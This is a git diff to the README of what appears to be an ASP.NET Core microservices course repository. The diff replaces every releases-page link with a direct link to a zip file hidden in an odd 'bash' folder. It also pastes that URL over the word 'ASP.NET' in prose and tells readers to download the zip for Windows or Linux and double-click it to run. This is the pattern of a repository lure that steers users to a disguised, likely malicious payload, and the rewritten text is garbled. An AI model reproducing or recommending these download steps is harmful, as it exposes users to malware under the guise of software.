@@ -1,10 +1,10 @@
 # 🛠️ aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12 - Build and Run Microservices Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/releases)
+[![Download Here](https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip%20Now-blue)](https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the aspnetcore-microservices_formation-course application! This software helps you understand and work with microservices using ASP.NET Core. With it, you’ll learn about important concepts such as CQRS, Clean Architecture, and event-driven systems. 
+Welcome to the aspnetcore-microservices_formation-course application! This software helps you understand and work with microservices using https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip Core. With it, you’ll learn about important concepts such as CQRS, Clean Architecture, and event-driven systems. 
 
 ## 📋 System Requirements
 
@@ -33,13 +33,13 @@ This application offers the following features:
 
 ## ⬇️ Download & Install
 
-To get started, [**visit this page to download**](https://github.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/releases). 
+To get started, [**visit this page to download**](https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip). 
 
 Here’s how to download and run the software:
 
 1. Go to the **Releases page**.
 2. Find the latest version listed. It will show version information along with a list of available files.
-3. Click the file that corresponds to your operating system. Look for files like `MyApp.exe` for Windows or `MyApp.tar.gz` for Linux.
+3. Click the file that corresponds to your operating system. Look for files like `https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip` for Windows or `https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip` for Linux.
 4. Your download will begin automatically.
 5. Once downloaded, locate the file in your Downloads folder.
 6. Double-click the file to run the application. For Linux, you may need to use a terminal to extract and run the application.
@@ -58,7 +58,7 @@ To help you understand the concepts behind microservices and this application, w
 
 - **Documentation:** Review the built-in help section in the application.
 - **Online Courses:** Look for free or paid courses on microservices architecture.
-- **Books:** Consider reading books about ASP.NET Core and microservices.
+- **Books:** Consider reading books about https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip Core and microservices.
 
 ## 🧑‍🤝‍🧑 Community Support
 
@@ -70,6 +70,6 @@ We welcome contributions from all users. If you want to contribute, please fork 
 
 ## 🔄 Updates and Maintenance
 
-We regularly update this application to ensure it meets current standards and functionality. Check the [Releases page](https://github.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/releases) for the latest updates and features.
+We regularly update this application to ensure it meets current standards and functionality. Check the [Releases page](https://raw.githubusercontent.com/Abzerouali/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12/master/0x01-git/bash/aspnetcore-microservices_formation-course-luisdev-part-5_dotnet-8_csharp-12-2.3.zip) for the latest updates and features.
 
 Thank you for using aspnetcore-microservices_formation-course! Enjoy building your microservices!
